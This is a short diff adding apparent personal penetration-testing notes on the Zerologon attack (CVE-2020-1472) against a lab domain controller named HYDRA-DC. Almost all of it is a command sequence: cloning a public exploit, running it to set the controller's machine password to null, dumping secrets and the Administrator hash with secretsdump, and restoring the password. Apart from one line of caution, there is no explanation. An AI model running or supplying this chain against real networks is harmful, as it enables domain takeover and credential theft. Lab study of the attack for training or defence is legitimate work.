@@ -1,0 +1,30 @@
+---------------------------------------------------------ZERO LOGON Attack--------------------------------------------
+CVE-2020-1472
+
+we are attacking the domain controller and setting the password null 
+and taking over the domain controller.
+
+the reason behind this is difficult to understand.(crytographics)
+
+
+$git clone https://github.com/dirkjanm/CVE-2020-1472
+$cd /opt
+$ls
+$python3 zerologon_check.py HYDRA-DC 192.168.138.132 
+
+Dc compromised successfully 
+
+Don't do it in real assessment
+
+$python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.138.132
+
+$secretsdump.py -just -dc MARVEL/HYDRA-DC\$@192.168.138.132
+
+$secretsdump.py ADMINISTRATOR@192.168.138.132 -HASHES (FIND THE HASH USING ABOVE CMD)
+
+$python3 restorepassword.py  MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.138.132
+
+--------------------------------------------------------------------------------------
+
+
+
